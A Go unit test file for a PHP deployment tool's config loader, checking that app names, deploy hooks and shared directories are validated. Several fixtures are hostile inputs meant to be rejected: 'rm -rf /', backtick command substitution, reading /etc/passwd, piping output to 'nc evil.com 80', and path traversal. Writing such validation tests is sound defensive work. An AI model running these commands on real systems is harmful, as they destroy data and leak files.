package config

import (
	"os"
	"path/filepath"
	"testing"
)

func TestLoadProjectConfig_ValidatesAppName(t *testing.T) {
	tests := []struct {
		name    string
		yaml    string
		wantErr bool
	}{
		{
			"valid name",
			"name: my-app\nphp:\n  version: '8.3'\n",
			false,
		},
		{
			"injection in name",
			"name: \"my-app; rm -rf /\"\nphp:\n  version: '8.3'\n",
			true,
		},
		{
			"backtick in name",
			"name: \"app`id`\"\nphp:\n  version: '8.3'\n",
			true,
		},
		{
			"empty name is allowed",
			"php:\n  version: '8.3'\n",
			false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := t.TempDir()
			path := filepath.Join(dir, "frankendeploy.yaml")
			if err := os.WriteFile(path, []byte(tt.yaml), 0644); err != nil {
				t.Fatal(err)
			}

			_, err := LoadProjectConfig(path)
			if (err != nil) != tt.wantErr {
				t.Errorf("LoadProjectConfig() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestLoadProjectConfig_ValidatesHooks(t *testing.T) {
	tests := []struct {
		name    string
		yaml    string
		wantErr bool
	}{
		{
			"valid hooks",
			"name: my-app\nphp:\n  version: '8.3'\ndeploy:\n  hooks:\n    pre_deploy:\n      - php bin/console doctrine:migrations:migrate --no-interaction\n",
			false,
		},
		{
			"injection in pre_deploy hook",
			"name: my-app\nphp:\n  version: '8.3'\ndeploy:\n  hooks:\n    pre_deploy:\n      - \"php bin/console; rm -rf /\"\n",
			true,
		},
		{
			"injection in post_deploy hook",
			"name: my-app\nphp:\n  version: '8.3'\ndeploy:\n  hooks:\n    post_deploy:\n      - \"echo done && cat /etc/passwd\"\n",
			true,
		},
		{
			"pipe in hook",
			"name: my-app\nphp:\n  version: '8.3'\ndeploy:\n  hooks:\n    pre_deploy:\n      - \"php bin/console | nc evil.com 80\"\n",
			true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := t.TempDir()
			path := filepath.Join(dir, "frankendeploy.yaml")
			if err := os.WriteFile(path, []byte(tt.yaml), 0644); err != nil {
				t.Fatal(err)
			}

			_, err := LoadProjectConfig(path)
			if (err != nil) != tt.wantErr {
				t.Errorf("LoadProjectConfig() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestLoadProjectConfig_ValidatesSharedDirs(t *testing.T) {
	tests := []struct {
		name    string
		yaml    string
		wantErr bool
	}{
		{
			"valid shared dirs",
			"name: my-app\nphp:\n  version: '8.3'\ndeploy:\n  shared_dirs:\n    - var/log\n    - var/sessions\n",
			false,
		},
		{
			"path traversal in shared dir",
			"name: my-app\nphp:\n  version: '8.3'\ndeploy:\n  shared_dirs:\n    - \"../../etc/passwd\"\n",
			true,
		},
		{
			"absolute path in shared dir",
			"name: my-app\nphp:\n  version: '8.3'\ndeploy:\n  shared_dirs:\n    - /etc/shadow\n",
			true,
		},
		{
			"shell metachar in shared dir",
			"name: my-app\nphp:\n  version: '8.3'\ndeploy:\n  shared_dirs:\n    - \"var;id\"\n",
			true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := t.TempDir()
			path := filepath.Join(dir, "frankendeploy.yaml")
			if err := os.WriteFile(path, []byte(tt.yaml), 0644); err != nil {
				t.Fatal(err)
			}

			_, err := LoadProjectConfig(path)
			if (err != nil) != tt.wantErr {
				t.Errorf("LoadProjectConfig() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestNormalizeDBDriver(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		{"pdo_pgsql", "pgsql"},
		{"postgresql", "pgsql"},
		{"postgres", "pgsql"},
		{"pdo_mysql", "mysql"},
		{"mysqli", "mysql"},
		{"pdo_sqlite", "sqlite"},
		{"sqlite3", "sqlite"},
		{"pgsql", "pgsql"},
		{"mysql", "mysql"},
		{"sqlite", "sqlite"},
		{"unknown", "unknown"},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			got := NormalizeDBDriver(tt.input)
			if got != tt.expected {
				t.Errorf("NormalizeDBDriver(%q) = %q, want %q", tt.input, got, tt.expected)
			}
		})
	}
}
